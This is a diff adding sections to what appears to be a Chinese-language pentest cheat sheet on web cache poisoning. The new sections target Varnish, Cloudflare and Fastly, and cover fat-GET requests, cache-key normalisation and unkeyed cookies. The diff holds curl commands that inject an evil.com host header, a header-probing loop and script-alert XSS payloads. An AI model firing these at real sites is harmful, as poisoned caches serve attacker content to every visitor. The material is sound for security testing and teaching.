@@ -99,6 +99,87 @@ Origin: https://evil.com
 Referer: https://evil.com
 ```
 
+## 6. 缓存层特定攻击
+
+### 6.1 Varnish 缓存投毒
+
+```bash
+# Varnish 默认: GET + 无Cookie = 可缓存
+# 投毒路径:
+curl -H "X-Forwarded-Host: evil.com" "https://target.com/static/app.js"
+# → Varnish缓存: /static/app.js 内容包含 evil.com 引用
+# → 所有用户加载: <script src="https://evil.com/app.js">
+
+# VCL 配置缺陷检查:
+# 如果 VCL 只对Host+Path做hash → 其他header不在hash中 → 可投毒
+```
+
+### 6.2 Cloudflare / CDN 缓存投毒
+
+```bash
+# CDN 缓存键策略差异:
+# Cloudflare: 默认 Host + Path + QueryString
+# 非键化Header → 可投毒
+curl -H "X-Forwarded-Host: evil.com" "https://target.com/" \
+  -H "CF-Connecting-IP: 127.0.0.1"
+# 如果响应中使用了CF-Connecting-IP → 且不在缓存键中 → 可投毒
+
+# 查看Cloudflare缓存状态:
+curl -I "https://target.com/" | grep -i "cf-cache-status"
+# CF-Cache-Status: HIT → 缓存命中
+```
+
+### 6.3 Fastly 缓存投毒
+
+```bash
+# Fastly 缓存键配置可在 VCL 自定义
+# 测试: 检查哪些header影响内容但不影响缓存键
+for header in "X-Forwarded-Host: evil.com" "X-Forwarded-Scheme: http" \
+              "X-Forwarded-Proto: http" "X-Forwarded-Port: 80"; do
+  curl -s -H "$header" "https://target.com/" | grep -c "evil" && echo "[+] $header"
+done
+```
+
+## 7. Fat GET 投毒
+
+```bash
+# 某些缓存: GET 请求的 Body 不计入缓存键, 但影响后端响应
+GET / HTTP/1.1
+Host: target.com
+Content-Length: 30
+
+x=1&y=<script>alert(1)</script>
+
+# ★ GET带Body → 后端处理body → 响应含XSS
+# → 缓存以 GET / 为键 → 缓存了含XSS的响应!
+```
+
+## 8. 缓存键归一化攻击
+
+```bash
+# 缓存键 = 去除特定参数的URL → 添加被去除的参数可投毒
+# 例: 缓存键排除 utm_* 参数
+
+# 正常: /page?utm_campaign=foo → 缓存键: /page
+# 投毒: /page?utm_campaign=foo&callback=alert(1)
+# → 缓存键: /page (utm_*被忽略)
+# → 响应包含 callback=alert(1)
+# → 其他用户访问 /page → 拿到投毒响应!
+
+# 检测:
+# 访问 /test?a=1&utm_source=x → 观察缓存是否忽略utm_source
+```
+
+## 9. 未键化Cookie投毒
+
+```bash
+# 某些缓存: 只对特定Cookie做hash, 其他Cookie不计入缓存键
+# 投毒:
+curl -b "unkeyed_cookie=<script>alert(1)</script>" "https://target.com/page"
+
+# 缓存以 忽略unkeyed_cookie 的键存储 → 所有用户受影响
+```
+
 ---
 
-*参考: PortSwigger Web Cache Poisoning + 实战案例*
+*参考: PortSwigger Web Cache Poisoning + CWE-525 + 实战案例*
